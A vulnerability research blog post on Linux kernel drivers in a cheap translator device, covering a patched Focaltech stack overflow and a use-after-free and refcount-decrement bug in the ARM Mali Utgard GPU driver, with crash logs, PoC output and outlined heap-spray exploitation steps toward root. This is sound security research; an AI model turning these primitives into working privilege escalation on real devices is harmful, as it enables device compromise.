---
published: true
title: "🗺️ [1] Looking at Drivers, Finding Bugs"
toc: true
toc_sticky: true
tagline: "I've never done any Linux kernel exploitation, and I really want to find a kernel bug in the wild. Lets have a look at drivers that are available at our current privilege level."
windowGradientStart: rgb(0, 11, 130)
windowGradientEnd: rgb(8, 0, 165)
windowBorder: rgb(0, 0, 0)
minimizeButton: rgb(47, 255, 0)
maximizeButton: rgb(255, 162, 0)
closeButton: rgb(255, 0, 0)
tags:
  - Linux Kernel Driver
  - Vulnerability Research
---

Lets take a look at the drivers we can interact with.

**/proc** and **/dev** usually contain interesting devices, and you can simply use **ls -al** to list all of them and see what permissions you have on each (unless the device has SELinux then its a bit more complicated, but the translator doesn't!).

In **/dev** we have:

```
crw-rw-rw-  1 root      root          10,  52 2010-01-28 04:50 ashmem
crw-rw-rw-  1 root      root          10,  53 2010-01-28 04:50 binder
crw-rw-rw-  1 root      root           1,   7 2010-01-28 04:50 full
crw-rw-rw-  1 system    graphics      10,  62 2010-01-28 04:50 ion
crw-rw-rw-  1 system    graphics      10,  61 2010-01-28 04:50 mali
crw-rw-rw-  1 root      root           1,   3 2010-01-28 04:50 null
crw-rw-rw-  1 root      radio          5,   2 2010-01-28 11:15 ptmx
crw-rw-rw-  1 root      root           1,   8 2010-01-28 04:50 random
crw-rw-rw-  1 root      root           5,   0 2010-01-28 04:50 tty
crw-rw-rw-  1 root      root           1,   9 2010-01-28 04:50 urandom
crw-rw-rw-  1 root      root           1,   5 2010-01-28 04:50 zero
```


# /proc/ftxxxx-debug

A friend and fellow hacker of weird and wonderful stuff, Callum a.k.a [CUB3D, the man who hacked the IPod](https://github.com/CUB3D), got a different translator off of Aliexpress to mess about with, and he discovered a [series of blogs](https://stigward.github.io/posts/fiio-m6-kernel-bug/) involving an Aliexpress MP3 player with this driver.

The driver on both this MP3 player, and the other translator, was vulnerable to this stack overflow:

```cpp
static ssize_t ftxxxx_debug_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos)
{
	... 

	unsigned char writebuf[FTS_PACKET_LENGTH];
	int buflen = count;
	int writelen = 0;
	int ret = 0;

	if (copy_from_user(&writebuf, buf, buflen)) {
		dev_err(&client->dev, "%s:copy from user error\n", __func__);
		return -EFAULT;
	}
	proc_operate_mode = writebuf[0];

	...

}
```

You can just send in data, and if you send over more than **FTS_PACKET_LENGTH** bytes of data, it will overflow a kernel stack allocated buffer! So there I was, excited to learn some kernel exploitation with a nice and easy bug. I got home, made a PoC, and it didn't crash?

I used *mtkclient* to dump the kernel (*zImage*), used *binwalk* to extract it, and *basefind2* to get the base address of it - I then loaded it into Ghidra.

I came across the code responsible for this driver functionality (lots of debug strings) - the most useful was "*Focaltech V3.4 20211214*". Searching for this on Github, there are [several repositories](https://github.com/NothingOSS/android_kernel_msm-5.4_nothing_sm7325/tree/539538747842faa8e22145ac0b557b1c905f8979/drivers/input/touchscreen/focaltech_touch) with the source code of this specific driver. Lets take a look at the same code with the stack overflow in it on this version of the driver:

```cpp
static ssize_t fts_debug_read(
    struct file *filp, char __user *buff, size_t count, loff_t *ppos)
{
    int ret = 0;
    int num_read_chars = 0;
    int buflen = count;
    u8 *readbuf = NULL;
    u8 tmpbuf[PROC_BUF_SIZE] = { 0 };
    struct fts_ts_data *ts_data = PDE_DATA(file_inode(filp));
    struct ftxxxx_proc *proc = &ts_data->proc;

    if (buflen <= 0) {
        FTS_ERROR("apk proc read count(%d) fail", buflen);
        return -EINVAL;
    }

    if (buflen > PROC_BUF_SIZE) {
        readbuf = (u8 *)kzalloc(buflen * sizeof(u8), GFP_KERNEL);
        if (NULL == readbuf) {
            FTS_ERROR("apk proc buf zalloc fail");
            return -ENOMEM;
        }
    } else {
        readbuf = tmpbuf;
    }
```

It looks like in this version of the driver, they patched all the issues:
- Makes sure **buflen** is positive
- Upper bounds check on **buflen**, use **kzalloc** to allocate larger buffer if stack buffer isn't large enough

![rip.gif](/assets/images/translator/p2/rip.gif)

I stared at the driver for a bit, and I couldn't find any interesting race conditions that yielded useful primitives - this driver is pretty simple.

# /dev/mali

This is the ARM GPU, applications need access to this for things like games, GPU acceleration, etc. 

There are four variants of mali GPU:
- *Utgard*
- *Midgard*
- *Bifrost*
- *Valhall*

Where *Utgard* is the earliest generation, and *Valhall* is the latest. As this chipset is so old, we will likely be working with *Utgard* - confirmed by grepping the system partition extracted with *mtkclient*:

![utgard.png](/assets/images/translator/p2/utgard.png)

And we can find the specific version of the driver by grepping for **r?p?**, in this case we get a hit on **r6p2**:

![mali_version.png](/assets/images/translator/p2/mali_version.png)

And some source code for this specific driver is available [here](https://android.googlesource.com/kernel/amlogic-tv-modules/mali-driver/+/refs/tags/android-tv-10.0.0_r0.1/utgard/r6p2/).

## Rediscovering CVE-2022-34830

I decided the easiest way to work out what this bug is, is to do some patch-diffing. I used *Meld*, and compared r12p0 (latest version with the bug) and the latest r13p0 release of the driver code. The only information I could find is the following:

> *An Arm product family through 2022-06-29 has a TOCTOU Race Condition that allows non-privileged user to make improper GPU processing operations to gain access to already freed memory.*

I mean, it doesn't really help that much as it is VERY vague, but this is usually the case with a good chunk of bugs from the Android security bulletin! The thing to note is that it hints towards the bug being a use-after-free, and the cause of the bug is a race condition.

Aside from every single copyright address being modified, this was the only change observed:

![cve_2022_34830_patch.png](/assets/images/translator/p2/cve_2022_34830_patch.png)

This code doesn't exist in the *r6p2* version of the driver, so it doesn't appear to be of any use for us at the moment!

## A Patched UAF

When looking through changes in earlier driver versions (comparing *r6p2* to *r13p0*), there really isn't much that has changed between them - the most interesting change is within the **mali_mem_vma_close** function.

![diff.png](/assets/images/translator/p2/diff.png)

This function is called when **munmap** is called on some mapped memory, based on the added checks, they expect **vma->vm_private_data** (which is of type **mali_mem_allocation**) to not be NULL, otherwise extra code is skipped over.

Another related change is seen in **_mali_free_allocation_mem** which is called by **mali_allocation_unref** when the refcount for the allocation is 0.

![diff2.png](/assets/images/translator/p2/diff2.png)

And for some context, here is the **mali_allocation_unref** function:

```cpp
u32 mali_allocation_unref(struct mali_mem_allocation **alloc)
{
	u32 free_pages_nr = 0;
	mali_mem_allocation *mali_alloc = *alloc;
	*alloc = NULL;
	if (0 == _mali_osk_atomic_dec_return(&mali_alloc->mem_alloc_refcount)) {
		free_pages_nr = _mali_free_allocation_mem(mali_alloc);
	}
	return free_pages_nr;
}
```

In the added check in **_mali_free_allocation_mem**, they set **(mali_alloc->cpu_mapping.vma)->vm_private_data** to **NULL** (which is checked in the other patch) when it detects that the memory is mapped using the state of **mali_alloc->cpu_mapping.vma**. This means that if the **_mali_free_allocation_mem** function is called on memory that has been mapped with **mmap**, this will be caught in the **mali_mem_vma_close** function when the memory is unmapped before it is passed into **mali_allocation_unref** - rather than there being a UAF in **mali_allocation_unref** with a dangling pointer.

Okay, so now we know what these changes appear to patch, we can start to understand how to trigger the bug in the first place. As this is a race condition, and it involves **mmap** and **MALI_IOC_MEM_FREE**, I imagine there is probably a way to race these handlers such that **_mali_free_allocation_mem** is called during the memory mapping process. Lets take a look at the **mmap** code:

```c
int mali_mmap(struct file *filp, struct vm_area_struct *vma)
{
	struct mali_session_data *session;
	mali_mem_allocation *mali_alloc = NULL;
	u32 mali_addr = vma->vm_pgoff << PAGE_SHIFT;
	struct mali_vma_node *mali_vma_node = NULL;
	mali_mem_backend *mem_bkend = NULL;
	int ret = -EFAULT;

	...

	/* find mali allocation structure by vaddress*/
	mali_vma_node = mali_vma_offset_search(&session->allocation_mgr, mali_addr, 0);
	if (likely(mali_vma_node)) {
		mali_alloc = container_of(mali_vma_node, struct mali_mem_allocation, mali_vma_node);
		MALI_DEBUG_ASSERT(mali_addr == mali_vma_node->vm_node.start);
		if (unlikely(mali_addr != mali_vma_node->vm_node.start)) {
			/* only allow to use start address for mmap */
			MALI_DEBUG_PRINT(1, ("mali_addr != mali_vma_node->vm_node.start\n"));
			return -EFAULT;
		}
	} else {
		MALI_DEBUG_ASSERT(NULL == mali_vma_node);
		return -EFAULT;
	}

	...

out:
	MALI_DEBUG_ASSERT(MALI_MEM_ALLOCATION_VALID_MAGIC == mali_alloc->magic);

	vma->vm_private_data = (void *)mali_alloc;
	mali_alloc->cpu_mapping.vma = vma;

	mali_allocation_ref(mali_alloc);

	return 0;
}
```

Something to note here is the **mali_allocation_ref** call is near the end of the function. 

```cpp
void mali_allocation_ref(struct mali_mem_allocation *alloc)
{
	_mali_osk_atomic_inc(&alloc->mem_alloc_refcount);
}
```

If you look back at the **mali_allocation_unref** function I included earlier, you will see that the **_mali_free_allocation_mem** function is only called when the **mem_alloc_refcount** for the **mali_alloc** struct is 0 after the decrement occurs.

As the **mali_allocation_ref** call occurs near the end of the function, I believe the following events occur to trigger the vulnerability:
- Program allocates some memory using **MALI_IOC_MEM_ALLOC**
- Thread 1 calls **mmap** on this memory
- Thread 2 calls **ioctl** with **MALI_IOC_MEM_FREE**
- Thread 1 gets to the point where memory is mapped, but gets interrupted before **mali_allocation_ref** gets called (and the refcount gets incremented)
- Now, thread 2 executes normally without interruption, and calls **mali_allocation_unref** which ends up decrementing the refcount (which is initialised to 1) to 0, and therefore **_mali_free_allocation_mem** gets called - freeing the **mali_alloc** structure that is referenced by the **mmap**'d memory!
- Thread 1 eventually calls **mali_allocation_ref**, but by that point it is too late as the **mali_alloc** has already been freed!

### PoC

I threw together a PoC which triggers the bug consistently, all it does is race the **mmap** and **MALI_IOC_MEM_FREE** calls until an assert is triggered due to **munmap** (more on that soon). Here is the output:

```
[+] Mali Memory Handling Race Condition Test
[+] =======================================
[+] Successfully opened Mali device (fd=3)
[+] Test running for 50000 seconds...
[+] Control thread 3964 started
[+] Control thread: Iteration 1: Allocating memory
[+] Control thread: Allocation successful. GPU address: 0x00000000, ctx: 0
[+] MMAP thread 3963 started
[+] Control thread: Freeing memory at address 0x00000000
[+] Control thread: Memory freed! Pages freed: 256
[+] MMAP thread: Made 1 mapping attempts, 0 successful
...
[+] Control thread: Iteration 44: Allocating memory
[+] Control thread: Allocation successful. GPU address: 0x00000000, ctx: 0
[+] Control thread: Freeing memory at address 0x00000000
[+] MMAP thread: Successfully mapped memory at 0xb3d42000 (attempt 1, success 1)
[+] MMAP thread: Memory accessed successfully
[+] MMAP thread: Made 1 mapping attempts, 1 successful
[+] MMAP thread: Unmapping memory at 0xb3d42000
```

The device then crashes and reboots!

### Crash Analysis

We can look at the previous kernel crash dump by reading **/proc/last_kmsg**:

```
[   52.408593]  (0)[1970:mali_race]Mali: ERR: /workspace/kylin/mt6580_70/mt6580_70/kernel-3.18/drivers/misc/mediatek/gpu/gpu_mali/mali_utgard/mali/mali/linux/mali_memory_util.c
[   52.408617]            _mali_free_allocation_mem()  59
           ASSERT failed: NULL != mem_bkend
[   52.408646] -(0)[1970:mali_race]CPU: 0 PID: 1970 Comm: mali_race Tainted: G        W      3.18.35 #3
[   52.408656] Backtrace: 
[   52.408688] -(0)[1970:mali_race][<c010badc>] (dump_backtrace) from [<c010bc7c>] (show_stack+0x18/0x1c)
[   52.408698]  r6:c103d790 r5:ffffffff r4:00000000 r3:00000000
[   52.408739] -(0)[1970:mali_race][<c010bc64>] (show_stack) from [<c0a6e5a8>] (dump_stack+0x90/0xa4)
[   52.408758] -(0)[1970:mali_race][<c0a6e518>] (dump_stack) from [<c0528d90>] (_mali_osk_break+0x10/0x1c)
[   52.408767]  r8:00000000 r7:dc4c3000 r6:c1056bb8 r5:00100000 r4:d93dec80 r3:00000000
[   52.408812] -(0)[1970:mali_race][<c0528d80>] (_mali_osk_break) from [<c05339cc>] (mali_allocation_unref+0x360/0x370)
[   52.408830] -(0)[1970:mali_race][<c053366c>] (mali_allocation_unref) from [<c052a5d4>] (mali_mem_vma_close+0x24/0x34)
[   52.408840]  r8:de36a004 r7:00000000 r6:a7fe2000 r5:00000000 r4:cd94c528 r3:c052a5b0
[   52.408885] -(0)[1970:mali_race][<c052a5b0>] (mali_mem_vma_close) from [<c0205654>] (remove_vma+0x30/0x5c)
[   52.408895]  r4:cd94c528
[   52.408915] -(0)[1970:mali_race][<c0205624>] (remove_vma) from [<c0207558>] (do_munmap+0x22c/0x358)
[   52.408925]  r5:00000000 r4:de36a000
[   52.408951] -(0)[1970:mali_race][<c020732c>] (do_munmap) from [<c0208528>] (vm_munmap+0x44/0x58)
[   52.408960]  r10:00000000 r9:cb9d6000 r8:c01071a4 r7:a7fe2000 r6:00100000 r5:de36a000
[   52.408997]  r4:de36a038
[   52.409018] -(0)[1970:mali_race][<c02084e4>] (vm_munmap) from [<c0208560>] (SyS_munmap+0x24/0x28)
[   52.409027]  r7:0000005b r6:a82ff920 r5:a7fe2000 r4:00100000
[   52.409065] -(0)[1970:mali_race][<c020853c>] (SyS_munmap) from [<c0107000>] (ret_fast_syscall+0x0/0x38)
[   52.409074]  r5:a848a20d r4:a82ff920
```

The cause of the crash is the following assert:

```cpp
static u32 _mali_free_allocation_mem(mali_mem_allocation *mali_alloc)
{
	mali_mem_backend *mem_bkend = NULL;
	u32 free_pages_nr = 0;

	struct mali_session_data *session = mali_alloc->session;
	MALI_DEBUG_PRINT(4, (" _mali_free_allocation_mem, psize =0x%x! \n", mali_alloc->psize));
	if (0 == mali_alloc->psize)
		goto out;

	/* Get backend memory & Map on CPU */
	mutex_lock(&mali_idr_mutex);
	mem_bkend = idr_find(&mali_backend_idr, mali_alloc->backend_handle);
	mutex_unlock(&mali_idr_mutex);
	MALI_DEBUG_ASSERT(NULL != mem_bkend); // CAUSES THE CRASH
    ...
```

This is happening because the **mali_alloc** object has already been freed in the previous call to **_mali_free_allocation_mem**, and removed from the idr:

```cpp
mutex_lock(&mali_idr_mutex);
idr_remove(&mali_backend_idr, mali_alloc->backend_handle);
mutex_unlock(&mali_idr_mutex);
kfree(mem_bkend);
```

Hence, the **mali_alloc->backend_handle** will no longer get a mali allocation, and therefore the **mem_bkend** is null, triggering the assert! Therefore, this bug is working as expected.

### Exploit Ideas

We have a VMA mapping with a **vm_private_data** set to be a freed **mali_mem_allocation** object, and we should be able to refill the freed memory with something useful (and relatively controlled). This means we should be able to call **_mali_free_allocation_mem** on a controlled **mali_alloc** via **munmap**:
- **mmap** still points to freed **mali_alloc**
- Spray fake **mali_mem_allocation** onto the heap such that the new refcount is 1 (and will probably have to fix up pointers)
- **munmap** is called on the object, calls **mali_mem_vma_close** which calls **mali_allocation_unref** and as the refcount minus 1 is 0, calls **_mali_free_allocation_mem**
- Get a write primitive via the **list_del** function with a controlled argument, or get a UAF on the object we refilled the space with (but we will have corrupted the freelist)

Considerations:
- We'd need **mali_alloc->backend_handle** to be in the idr still or we assert in **_mali_free_allocation_mem**
    - If we could somehow get a controlled **mem_bkend**, or one with an unsupported type, that would be even better as we'd skip the underlying free logic for the memory type
- **mali_alloc->session** is another pointer that needs to be valid in our sprayed object
- Once we reach **mali_mem_allocation_struct_destroy**, we get the second **_mali_free_allocation_mem** on **mali_alloc** object, which will free the same memory address a second time - corrupting the freelist

As this has been patched, it probably is worth seeing if I can find something else before I spend time writing an exploit for this, as I want something that will work on the latest version of the driver.

## Refcount Decrement Primitive via Use-After-Free

While looking at the code, I thought about how **mali_allocation_unref** is being used and what it actually does:

```c
u32 mali_allocation_unref(struct mali_mem_allocation **alloc)
{
	u32 free_pages_nr = 0;
	mali_mem_allocation *mali_alloc = *alloc;
	*alloc = NULL;
	if (0 == _mali_osk_atomic_dec_return(&mali_alloc->mem_alloc_refcount)) {
		free_pages_nr = _mali_free_allocation_mem(mali_alloc);
	}
	return free_pages_nr;
}
```

Notice how it always calls **_mali_osk_atomic_dec_return**:

```c
/** @brief Decrement an atomic counter, return new value
 *
 * @param atom pointer to an atomic counter
 * @return The new value, after decrement */
u32 _mali_osk_atomic_dec_return(_mali_osk_atomic_t *atom);
```

So every time this is called, the refcount is decremented without fail according to the brief. Looking at the handler for **MALI_IOC_MEM_UNBIND**, it eventually calls **_mali_ukk_mem_unbind**:

```c
_mali_osk_errcode_t _mali_ukk_mem_unbind(_mali_uk_unbind_mem_s *args)
{
	/**/
	struct  mali_session_data *session = (struct mali_session_data *)(uintptr_t)args->ctx;
	mali_mem_allocation *mali_allocation = NULL;
	struct mali_vma_node *mali_vma_node = NULL;
	u32 mali_addr = args->vaddr;
	MALI_DEBUG_PRINT(5, (" _mali_ukk_mem_unbind, vaddr=0x%x! \n", args->vaddr));

	/* find the allocation by vaddr */
	mali_vma_node = mali_vma_offset_search(&session->allocation_mgr, mali_addr, 0);
	if (likely(mali_vma_node)) {
		MALI_DEBUG_ASSERT(mali_addr == mali_vma_node->vm_node.start);
		mali_allocation = container_of(mali_vma_node, struct mali_mem_allocation, mali_vma_node);
	} else {
		MALI_DEBUG_ASSERT(NULL != mali_vma_node);
		return _MALI_OSK_ERR_INVALID_ARGS;
	}

	if (NULL != mali_allocation)
		/* check ref_count */
		mali_allocation_unref(&mali_allocation);
	return _MALI_OSK_ERR_OK;
}
```

If a valid **mali_allocation** is found by **mali_vma_offset_search**, then **mali_allocation_unref** will always be called without fail. This means we are able to arbitrarily decrement the refcount for that **mali_alloc** object.

What does this give us? Well if we have a bunch of VMA mappings that reference the **mali_alloc**, we should be able to decrement the counter with **MALI_IOC_MEM_UNBIND** calls until the object is eventually freed early, giving us a UAF.

If we then look at **mali_mem_vma_close** which is called when we call **munmap**:

```c
static void mali_mem_vma_close(struct vm_area_struct *vma)
{
	/* If need to share the allocation, unref ref_count here */
	mali_mem_allocation *alloc = (mali_mem_allocation *)vma->vm_private_data;

	mali_allocation_unref(&alloc);
	vma->vm_private_data = NULL;
}
```

It just calls **mali_allocation_unref** again, meaning once the **mali_alloc** object has been freed, we can actually get a decrement primitive of the maximum amount of **mmap**'d memory we can have!

Note that **MALI_IOC_MEM_FREE** behaves basically identically as it calls the same functions, so both of these **ioctl** command handlers can be used to trigger the bug.

### Emulated PoC

Lets PoC this up in the emulated environment and see if it behaves as expected - this PoC will allocate memory, **mmap** it multiple times, call **MALI_IOC_MEM_FREE** on it to decrement the refcount while they remain mapped, and finally unmap the memory to decrement it after the free has occured.

First we allocate:

```
[+] Mali Reference Counter PoC
[TID:706] [DRIVER] Mali device opened
[+] Opened Mali device: 3
[TID:706] [DRIVER] Ioctl received 0xC0288201 0x7EFFFD48
[TID:706] [SIZE INFO] mali_alloc: 76 bytes, mali_backend: 120 bytes
[TID:706] [DRIVER] _mali_ukk_mem_allocate, initial vaddr=0x0, size=0x4000
[TID:706] [DRIVER] Allocated new GPU address: 0x80000000
[TID:706] [DRIVER] mali_mem_allocation_struct_create: allocated at 0x87a38f00
[TID:706] [DRIVER] Backend struct allocated at 0x87a38580
[TID:706] [DRIVER] Allocation successful - GPU addr: 0x80000000, ctx: 87b13d00, handle: 1, size: 16384
[TID:706] [DRIVER] Before copy to user: gpu_vaddr=0x80000000, ctx=87b13d00, handle=1
[+] Allocated memory: GPU VA=0x80000000, Backend Handle=1
[+] Using mmap offset: 0x0
```

Now we **mmap**:

```
[+] Mapping the memory region multiple times...
[TID:706] [DRIVER] MMap() handler: start=0x76F02000, phys=0x80000000, size=0x00004000 vma->flags 0x000000fb
[TID:706] [DRIVER] mali_allocation_ref : incrementing refcount
[+] Mapped region 0 at 0x76f02000
[+] Written data: Region 0
[TID:706] [DRIVER] MMap() handler: start=0x76EFE000, phys=0x80000000, size=0x00004000 vma->flags 0x000000fb
[TID:706] [DRIVER] mali_allocation_ref : incrementing refcount
[+] Mapped region 1 at 0x76efe000
[+] Written data: Region 1
[TID:706] [DRIVER] MMap() handler: start=0x76EFA000, phys=0x80000000, size=0x00004000 vma->flags 0x000000fb
[TID:706] [DRIVER] mali_allocation_ref : incrementing refcount
[+] Mapped region 2 at 0x76efa000
[+] Written data: Region 2
[TID:706] [DRIVER] MMap() handler: start=0x76EF6000, phys=0x80000000, size=0x00004000 vma->flags 0x000000fb
[TID:706] [DRIVER] mali_allocation_ref : incrementing refcount
[+] Mapped region 3 at 0x76ef6000
[+] Written data: Region 3
[TID:706] [DRIVER] MMap() handler: start=0x76EF2000, phys=0x80000000, size=0x00004000 vma->flags 0x000000fb
[TID:706] [DRIVER] mali_allocation_ref : incrementing refcount
[+] Mapped region 4 at 0x76ef2000
[+] Written data: Region 4
```

Now we **free**:

```
[+] Now freeing the allocation while it's still mapped...
[TID:706] [DRIVER] Ioctl received 0xC0288202 0x7EFFFD38
[TID:706] [DRIVER] mali_allocation_unref: refcount is 0x5
[+] Memory freed: 0 pages
[TID:706] [DRIVER] Ioctl received 0xC0288202 0x7EFFFD38
[TID:706] [DRIVER] mali_allocation_unref: refcount is 0x4
[+] Memory freed: 0 pages
[TID:706] [DRIVER] Ioctl received 0xC0288202 0x7EFFFD38
[TID:706] [DRIVER] mali_allocation_unref: refcount is 0x3
[+] Memory freed: 0 pages
[TID:706] [DRIVER] Ioctl received 0xC0288202 0x7EFFFD38
[TID:706] [DRIVER] mali_allocation_unref: refcount is 0x2
[+] Memory freed: 0 pages
```

Finally, we **munmap** (underlying structures get freed on the second one as the refcount has reached zero):

```
[+] Unmapping the regions
[+] Attempting to unmap region 0 at 0x76f02000
[TID:706] [DRIVER] mali_mem_vma_close: unreferencing allocation 87a38f00
[TID:706] [DRIVER] mali_allocation_unref: refcount is 0x1
[+] Unmapped region 0
[+] Attempting to unmap region 1 at 0x76efe000
[TID:706] [DRIVER] mali_mem_vma_close: unreferencing allocation 87a38f00
[TID:706] [DRIVER] mali_allocation_unref: refcount is 0x0
[TID:706] [DRIVER] [?] Entered _mali_free_allocation_mem
[TID:706] [DRIVER] Backend found! 0x87a38580
[TID:706] [DRIVER] _mali_free_allocation_mem is freeing backend [TID:706] [DRIVER] mali_vma_offset_remove 0x87b13d50 0x87a38f20
[TID:706] [DRIVER] mali_vma_offset_remove done 0x87b13d50 0x87a38f20
[TID:706] [DRIVER] _mali_free_allocation_mem : calling mali_mem_allocation_struct_destroy on 0x87a38f00
[TID:706] [DRIVER] [!!] mali_mem_allocation_struct_destroy: Calling list_del on: 0x87a38f3c
[TID:706] [DRIVER] [!!] Destroying mali_mem allocation stored at: 0x87a38f00
[+] Unmapped region 1
[+] Attempting to unmap region 2 at 0x76efa000
[TID:706] [DRIVER] mali_mem_vma_close: unreferencing allocation 87a38f00
[TID:706] [DRIVER] mali_allocation_unref: refcount is 0xffffffff
[+] Unmapped region 2
[+] Attempting to unmap region 3 at 0x76ef6000
[TID:706] [DRIVER] mali_mem_vma_close: unreferencing allocation 87a38f00
[TID:706] [DRIVER] mali_allocation_unref: refcount is 0xfffffffe
[+] Unmapped region 3
[+] Attempting to unmap region 4 at 0x76ef2000
[TID:706] [DRIVER] mali_mem_vma_close: unreferencing allocation 87a38f00
[TID:706] [DRIVER] mali_allocation_unref: refcount is 0xfffffffd
[+] Unmapped region 4
[TID:706] [DRIVER] Mali device closed
[+] Test completed
```

As you can see, the refcount has decremented to -1, -2, -3, etc. This is expected, as we aren't running a thread to re-allocate the freed structures (which would impact the refcount) - lets try that by using the trusty old **sendmsg** spray from earlier:

```
[+] Unmapped region 1
[+] Attempting to unmap region 2 at 0x74f26000
[TID:706] [DRIVER] mali_mem_vma_close: unreferencing allocation 879f4200
[TID:706] [DRIVER] mali_allocation_unref: refcount is 0x41414140
[+] Unmapped region 2
[+] Attempting to unmap region 3 at 0x74f22000
[TID:706] [DRIVER] mali_mem_vma_close: unreferencing allocation 879f4200
[TID:706] [DRIVER] mali_allocation_unref: refcount is 0x41414140
[+] Unmapped region 3
[+] Attempting to unmap region 4 at 0x74f1e000
[TID:706] [DRIVER] mali_mem_vma_close: unreferencing allocation 879f4200
[TID:706] [DRIVER] mali_allocation_unref: refcount is 0x41414140
```

Nice, so it looks like it is possible to overwrite it! It would be good if we can figure out a way of corrupting one of these on the device, then cause a crash so we can be certain the driver is behaving as expected. 

*Note:* The reason it doesn't decrement below *0x41414140* is because we aren't maintaining a reference to the buffer used by **sendmsg**, so it gets freed, then when the next **sendmsg** comes in, it reuses that buffer and replaces the data again with *0x41414141*, which gets decremented again to *0x41414140*, etc.

### Device PoC

We should be able to overwrite the refcount with a value of *0x1* (or something low enough that it will eventually hit *0x0*), so when it is freed again, it should actually go into the free branch instead of just decrementing the refcount again, causing a crash. Lets try it on the device:

```
[  262.517099]  (1)[2007:mali_race]Alignment trap: not handling instruction e1932f9f at [<c05338c4>]
[  262.517120]  (1)[2007:mali_race]Unhandled fault: alignment exception (0x001) at 0x000000d9
[  262.517140] -(1)[2007:mali_race]Internal error: : 1 [#1] PREEMPT SMP ARM
[  262.517155] disable aee kernel api
[  263.517181] -(1)[2007:mali_race]Non-crashing CPUs did not react to IPI
[  263.517208] -(1)[2007:mali_race]CPU: 1 PID: 2007 Comm: mali_race Tainted: G        W      3.18.35 #3
[  263.517226] -(1)[2007:mali_race]task: d277a400 ti: cd5b4000 task.ti: cd5b4000
[  263.517253] -(1)[2007:mali_race]PC is at mali_allocation_unref+0x25c/0x370
[  263.517270] -(1)[2007:mali_race]LR is at mali_mem_os_release+0xac/0x230
[  263.517287] -(1)[2007:mali_race]pc : [<c05338c8>]    lr : [<c052cbf8>]    psr: 80070013
[  263.517287] sp : cd5b5ed0  ip : cd5b5ea8  fp : cd5b5ef4
[  263.517304] -(1)[2007:mali_race]r10: cd5d3580  r9 : cd5d3580  r8 : de093980
[  263.517319] -(1)[2007:mali_race]r7 : 00000001  r6 : c1056bb8  r5 : 00000040  r4 : dc6e7b80
[  263.517335] -(1)[2007:mali_race]r3 : 000000d9  r2 : 00000000  r1 : dc626840  r0 : 00000040
[  263.517352] -(1)[2007:mali_race]Flags: Nzcv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user
[  263.517367] -(1)[2007:mali_race]Control: 10c5387d  Table: 8bd1c06a  DAC: 00000015
[  263.517381] -(1)[2007:mali_race]
```

I got this crash after a few attempts, and this occurs because we have overwritten the refcount to have a low value (0x1). If we look at the instructions we crash on in the device kernel:

![uaf_crash_instructions.png](/assets/images/translator/p2/uaf_crash_instructions.png)

We can see where the *0xd9* (*r3*) value comes from, our *0x1* (*r7*) is being added and dereferenced - this is actually because we overwrote **mali_alloc->session** with *0x1* and this points to a value that gets decremented with **atomic_sub**.

This means that the following sequence of events must have taken place on the device:
- **mali_alloc** was freed
- **sendmsg** syscall handler allocated that buffer and copied in the array of *0x1*'s
- We called **munmap** on one of the buggy **mmap**'s we created earlier, causing the *0x1* now occupying the *refcount* position to be decremented
- As this is now *0x0*, the code tries to free the **mali_alloc** object, but as **&mali_alloc->session** has also been overwritten with *0x1*'s, a crash occurs

Therefore, we must be overwriting the freed *mali_alloc* object, and can get a decrement on it - a pretty useful primitive if we can line something up.

After a bit of testing, we can get a decent number of **mmap** to occur - I got up to *65449* before it ran out of memory. 

### Exploit Ideas

So, we have a decrement of a fixed location of up to *65449* - this is assuming we can keep the UAF object alive for the duration of the exploit, which should be doable. 

We are going to need to refill the freed **mali_alloc** structure with something useful for exploitation. We also need to workout the offset that we can decrement into the structure, we can look at the kernel in Ghidra for this:

![refcount_offset.png](/assets/images/translator/p2/refcount_offset.png)

We can see we can decrement at an offset of *0x4c* (76) - lets hope the stars align and we get some interesting objects located at this offset!

# Conclusion

In this blog, we took a look at some accessible **/proc** and **/dev** entries, found some source code for them, and found some useful primitives/bugs. The main finding is a bug in the ARM mali Utgard driver for which we have written a PoC, and triggered a crash on the device. In the next blog, we'll see if we can use this bug to get a root shell.